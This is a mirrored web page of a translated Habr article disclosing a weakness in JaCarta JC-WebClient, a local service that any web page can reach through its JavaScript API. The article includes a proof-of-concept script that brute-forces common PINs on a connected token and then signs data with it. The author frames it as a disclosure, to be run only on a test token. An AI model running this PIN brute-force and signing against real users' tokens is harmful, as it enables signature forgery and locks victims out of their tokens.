@@ -1,0 +1,132 @@
+<!doctype html>
+<html class="no-js" lang="en">
+
+<head>
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-134228602-1');
+  </script>
+
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Test JaCarta WebClient or store tokens in a safe</title>
+  <meta name="description" content="“When black cover drifted aside for a moment, Margherita turned round and saw that there were not only multi-colored towers with an airplane unfolding...">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="stylesheet" href="../../css/main.css">
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>
+</head>
+
+<body>
+  <!--[if lte IE 9]>
+    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
+  <![endif]-->
+  <nav class="page-headings-container js-page-headings-container"></nav>
+  <div class="tools-bar js-tools-bar">
+    <!-- <a href="https://quick-geek.github.io/search.html" title="Search">🔎</a> -->
+    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">📜</a>
+    <a class="js-go-to-top-button" href="#" title="Go to Top">⬆️</a>
+    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">⬇️</a>
+  </div>
+  <section class="page js-page"><h1>Test JaCarta WebClient or store tokens in a safe</h1><div class="post__text post__text-html js-mediator-article"> <i>“When black cover drifted aside for a moment, Margherita turned round and saw that there were not only multi-colored towers with an airplane unfolding above them, but the city itself had not left for a long time and had left only fog in itself.”</i> <i><br><br></i>  <i>M.A.</i>  <i>Bulgakov</i> <i><br></i>  <i>"The Master and Margarita"</i> <br><br>  Hi, Habr!  Probably almost every Russian organization has these products in a fun multicolored coloring.  We are talking about products JaCarta and software to them.  This happiness came to me too, and I decided to push the black cover a little to hide their essence, in other words API.  Some banks, especially issuing JaCarta GOST-2 tokens to their customers, require the installation of the JC-WebClient application from Aladdin RD to work. <br><br>  Although there is no fresh distribution on the official website of the developer (in the Demo section, you can download the older version, but it uses outdated API), the distribution can be found using Google on the line "JC-WebClient-4.0.0.1186" on the RBS sites. <br><br>  After installing the application on the user's computer, port 24738 opens on which this client is running. <br><br> <code>https://localhost:24738/JCWebClient.js</code> <br> <br>  The developer’s website describes the API of this application openly and in detail (as well as the file system functions of the entire line of tokens of this manufacturer via jcFS.dll, included in the “JaCarta Single Client” installation package) and the point is that with a number of functions you can or sign the EDS on the token with anything, pick up the pin code, or block the token with unsuccessful attempts to enter it.  And all this remotely, via the Internet. <br><a name="habracut"></a><br>  It’s no secret that users often leave the token with the pin code by default, or the one with which they received it (they are usually afraid that when changing the pin code, everything will stop working). <br><br>  The most commonly used pin codes are 123456, and the token during the working day, or even around the clock, is plugged into the computer port or usb hub. <br><br>  Thanks to JC-WebClient, if such a user is allowed to slip a webpage or a letter with uncomplicated JavaScript, then it becomes possible not to get the keys of the token (in some cases this is possible only by directly accessing the token file system, <a href="https://habr.com/post/276057/">an example has already been given here</a> ), but pick up the pin code and sign any data and send it somewhere. <br><br>  In case of 10 unsuccessful attempts to bust, the token is blocked, and how often it happens, if the pin of the administrator code for unlocking is not set, then only initialization will help.  And this is not the time paid taxes (and as a result of penalties and even blocking the settlement account of the tax organization), penalties from suppliers, in general, there is little good. <br><br><img src="https://habrastorage.org/webt/vr/wy/qe/vrwyqehr02krqg9muflt0rndgqa.jpeg"><br><br>  The problem with brute force of the pin code could be solved either by making it possible to enter it only through the JC-WebClient interface window, or as a half-measure, in the case of for example 3 unsuccessful input attempts, to block further authorization, display a message to the user, and wait until it confirm your actions. <br><br>  I wrote a small test script that shows this vulnerability.  The script works on all modern and relatively modern browsers, even IE :) <br><br>  Naturally, he does not send anything anywhere, but simply displays the results of the work of a sequence of functions. <br><br>  The script implements a full brute force of 10 attempts to enter the PIN code "for slaughter" the token, so you can run the script only with a test token! <br><br>  You should also remember that the use of this script otherwise than on your own test token is a violation of the law. <br><br>  Test result: <br><br><img src="https://habrastorage.org/webt/et/g1/ma/etg1ma5gplp9lsyedbytdzxtcx8.jpeg"><br>  Key generation and certificate generation script using JC-WebClient for testing. <br>  You can use EToken PRO Java 72 K, JaCarta GOST, JaCarta GOST-2.  The token must be pre-initialized with pin user code 111111. <br><br>  Before testing, you need to install JC-WebClient version not lower than 4. <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//Инициализация JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient был успешно инициализирован"+" "); //Получаем версию JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write("Версия JCWebClient2 " + vers +" "); //Получаем доступ к слотам и определяем число подключенных токенов var slots = JCWebClient2.getAllSlots(); document.write("Подключено токенов: "+slots.length+" "); //Выводим модель токенов for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write("Токен: "+slot.device.name+" "+slot.device.model+" "); } var tokenID = slot.id, // Идентификатор токена userPin = '111111'; // PIN-код пользователя // Проверить текущее состояние аутентификации на токене // (должно равняться JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('1) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); // Предъявить PIN-код JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: userPin } }); // Проверить изменившееся состояние // (должно равняться JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('2) Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); // Создать контейнер с ключевой парой и присвоить ему имя var keyPairID = JCWebClient2.createKeyPair({ args: { paramSet: "XA", description: "my description", algorithm: JCWebClient2.Vars.KeyAlgorithm.GOST_2012_256 } }); // Задать отличительное имя пользователя (Distinguished Name (DN)), // включающее стандартное имя (Common Name, (CN)) var dn = { 'CN': '123', 'C': 'RU' }; // Задать расширения, определяющие область применения закрытого ключа var exts = { 'keyUsage': 'Digital Signature' }; // Записать сертификат var contID = JCWebClient2.generateUserSelfSignedCertificate({ args: { keyPairID: keyPairID, dn: dn, exts: exts, days: 365 } }); //Массив информации на токенах var list=[]; //Получаем список контейнеров list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); //Получаем id и информацию о созданном контейнере var data = list[0]; var contID = data.id; document.write("ID контейнера: "+data.id+" "); document.write("Описание контейнера: "+data.description+" "); document.write("Алгоритм подписи: "+data.algorithm+" "); // Отменить ввод PIN-кода JCWebClient2.unbindToken();</span></span></code> </pre> <br>  And the security audit script itself: <br><br><pre> <code class="javascript hljs"><span class="hljs-comment"><span class="hljs-comment">//Инициализация JCWebClient2 JCWebClient2.initialize(); document.write("JC-WebClient был успешно инициализирован"+" "); //Получаем версию JCWebClient2 var vers=JCWebClient2.getJCWebClientVersion(); document.write("Версия JCWebClient2 " + vers +" "); //Получаем доступ к слотам и определяем число подключенных токенов var slots = JCWebClient2.getAllSlots(); document.write("Подключено токенов: "+slots.length+" "); //Выводим модель токенов for (i = 0; i &lt; slots.length; i++) { var slot = slots[i]; document.write("Токен: "+slot.device.name+" "+slot.device.model+" "); } // Идентификатор токена var tokenID = slot.id; // Проверить текущее состояние аутентификации на токене // (должно равняться JCWebClient2.Vars.AuthState.notBinded) var tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //Массив информации на токенах var list=[]; //Получаем список контейнеров list = JCWebClient2.getContainerList({ args: { tokenID: tokenID } }); //Получаем id и информацию о контейнере var data = list[0]; var contID = data.id; document.write("ID контейнера: "+data.id+" "); document.write("Описание контейнера: "+data.description+" "); document.write("Алгоритм подписи: "+data.algorithm+" "); // Данные для подписи (Hello World закодированное Base64) var dataToSign = 'SGVsbG8sIFdvcmxkIQ=='; document.write("Данные для подписи: "+dataToSign+" "); //Массив пин кодов var pin=["1234567890", "123456", "1234567", "12345678", "123456789", "0987654321", "111111", "qwerty", "012345", "0123456", "01234567"]; //функция авторизации function bind(pass) { JCWebClient2.bindToken({ args: { tokenID: tokenID, pin: pass } }); } var i=0; //Перебор пин кодов в цикле //Осторожно! При 10 неверных попытках токен блокируется!!!!!!!!!! while (i &lt; 10) { i++; try{ bind(pin[i]); tokenState = JCWebClient2.getLoggedInState(); //Если атака удалась, выводим результат и завершаем цикл if(tokenState.state=1) { document.write("Успешно подобран пин код: "+pin[i]+" "); break; } } //Вывод информации об ошибке catch(e){document.write(e+" ");} } // Проверить изменившееся состояние // (должно равняться JCWebClient2.Vars.AuthState.binded) tokenState = JCWebClient2.getLoggedInState(); document.write('Token is binded: ' + (tokenState.state == JCWebClient2.Vars.AuthState.binded)+" "); //Получаем содерижимое сертификата var CertificateBody=JCWebClient2.getCertificateBody({ args: { id: contID } }); document.write("CertificateBody: "+CertificateBody+" "); // Подписать данные, используя программное хэширование и вывести подписанное в Base64 var signedData = JCWebClient2.signBase64EncodedData({ args: { contID: contID, data: dataToSign, attachedSignature: true } }); document.write("Подписано успешно. "); document.write("Подписанные данные: "+signedData+" "); //Проверка подписи var signature = signedData; var res = JCWebClient2.verifyBase64EncodedData({ args: { signature: signature } }); document.write("Результат проверки подписи: "+res+" "); // Отменить ввод PIN-кода JCWebClient2.unbindToken();</span></span></code> </pre> <br>  → <a href="https://developer.aladdin-rd.ru/jc-webclient/4.0.0/index.html">JC-WebClient API Information Source</a> </div><p>Source: <a href="https://habr.com/ru/post/439790/">https://habr.com/ru/post/439790/</a></p>
+<section class="navigation-panel">
+<h4>More articles:</h4>
+<nav><ul class="list-of-pages">
+<li><a href="../439746/index.html">Understand the promises in javascript</a></li>
+<li><a href="../439748/index.html">The digest of interesting materials for the mobile developer # 285 (February 4 - 10)</a></li>
+<li><a href="../439750/index.html">Learn product management - where?</a></li>
+<li><a href="../439752/index.html">Multicore MRI Method</a></li>
+<li><a href="../439754/index.html">Google is going to be engaged in the development of smart watches</a></li>
+<li><a href="../439756/index.html">Why do I need a thermo-acoustic generator?</a></li>
+<li><a href="../439760/index.html">Engineers "twisted" the light in the fiber - a new technology will speed up the transfer of data a hundred times</a></li>
+<li><a href="../439764/index.html">Corporate fruit</a></li>
+<li><a href="../439772/index.html">Writing Unit Tests on Swift for Verifying Asynchronous Tasks</a></li>
+<li><a href="../439778/index.html">The digest of fresh materials from the world of the frontend for the last week No. 351 (February 4 - 10, 2019)</a></li>
+<li><a href="../439780/index.html">PHP Digest number 149 (January 28 - February 11, 2019)</a></li>
+<li><a href="../439782/index.html">Headless CMS - the future of content management</a></li>
+<li><a href="../439784/index.html">Methane engine "Raptor" broke the record RD-180</a></li>
+<li><a href="../439788/index.html">Regular oddities in the GOST Grasshopper and Stribog algorithms</a></li>
+<li><a href="../439790/index.html">Test JaCarta WebClient or store tokens in a safe</a></li>
+<li><a href="../439792/index.html">NASA is looking for partners in the American industry to create a partially reusable manned lender</a></li>
+<li><a href="../439794/index.html">Back pain - understanding from the perspective of modern medicine</a></li>
+<li><a href="../439796/index.html">Spring Boot 2: what is not written in release notes</a></li>
+<li><a href="../439800/index.html">RISEX and Julia. 5 stages of love customer and designer</a></li>
+<li><a href="../439806/index.html">Valid SSL domain names for local Docker containers</a></li>
+<li><a href="../439808/index.html">The biggest telescopes. From a notebook and eyes to 340 megapixel cameras and data centers. Part 1</a></li>
+<li><a href="../439810/index.html">Get acquainted with the Moleculer microservice framework</a></li>
+<li><a href="../439816/index.html">Practical blockchain in business</a></li>
+<li><a href="../439818/index.html">Features of approaches to design in the real manufacturing sector</a></li>
+<li><a href="../439820/index.html">We are trying to write a project alone. Introduction</a></li>
+<li><a href="../439822/index.html">Creating an alternative display for the Ensoniq EPS16 + and ASR10 synthesizer / sampler</a></li>
+<li><a href="../439824/index.html">When will the JavaScript frameworks disappear?</a></li>
+<li><a href="../439826/index.html">Disable analog. What will happen to the TV?</a></li>
+<li><a href="../439828/index.html">The network appeared "analog" Findface</a></li>
+<li><a href="../439840/index.html">Conference DUMP-2019: we invite you to speak in the sections Design, Management and Testing</a></li>
+<li><a href="../439852/index.html">Remote control application release: Aspia 1.1.0</a></li>
+<li><a href="../439858/index.html">Prometheus + Grafana + Node Exporter + Docker in Azure with notifications in Telegram</a></li>
+<li><a href="../439862/index.html">Digital events in Moscow from February 11 to 17</a></li>
+<li><a href="../439866/index.html">Principles of design reference books in 1C Enterprise Management 2 (ERP 2.4.6)</a></li>
+<li><a href="../439868/index.html">Life without Facebook: less radical views, good mood, more time for loved ones. Now proven by science</a></li>
+<li><a href="../439878/index.html">Creation of architecture for a new high-load startup in 2019</a></li>
+<li><a href="../439880/index.html">Security Week 07: Local IoT Device Vulnerabilities</a></li>
+<li><a href="../439886/index.html">How I trained the neural network to implement the position estimation function on the Russian AI Cup CodeBall 2018</a></li>
+<li><a href="../439894/index.html">How easy it is to monitor the site</a></li>
+<li><a href="../439900/index.html">Julia and the method of coordinate descent</a></li>
+<li><a href="../439902/index.html">Explaining the physical essence of the Wing Lift phenomenon without using the Bernouli equation. Part 2</a></li>
+<li><a href="../439906/index.html">Critical vulnerability in Zemana products and not only</a></li>
+<li><a href="../439908/index.html">Kohl, piss off ... Coax</a></li>
+<li><a href="../439912/index.html">Unsolved mystery of view</a></li>
+<li><a href="../439916/index.html">Unpacking: Dridex bootloader</a></li>
+<li><a href="../439922/index.html">Taxation of IP in Kazakhstan how to be a freelancer?</a></li>
+<li><a href="../439924/index.html">The volume of parcels from foreign online stores grew by 25%</a></li>
+</ul></nav>
+</section>
+<script src="../../js/main.js"></script>
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+  (function (d, w, c) {
+      (w[c] = w[c] || []).push(function() {
+          try {
+              w.yaCounter52319614 = new Ya.Metrika({
+                  id:52319614,
+                  clickmap:true,
+                  trackLinks:true,
+                  accurateTrackBounce:true,
+                  webvisor:true
+              });
+          } catch(e) { }
+      });
+
+      var n = d.getElementsByTagName("script")[0],
+          s = d.createElement("script"),
+          f = function () { n.parentNode.insertBefore(s, n); };
+      s.type = "text/javascript";
+      s.async = true;
+      s.src = "https://mc.yandex.ru/metrika/watch.js";
+
+      if (w.opera == "[object Opera]") {
+          d.addEventListener("DOMContentLoaded", f, false);
+      } else { f(); }
+  })(document, window, "yandex_metrika_callbacks");
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/52319614" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+
+<!-- Google Analytics -->
+  <script>
+    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
+    ga('create', 'UA-134228602-1', 'auto'); ga('send', 'pageview')
+  </script>
+  <script src="https://www.google-analytics.com/analytics.js" async defer></script>
+
+</section>
+</body>
+
+</html>
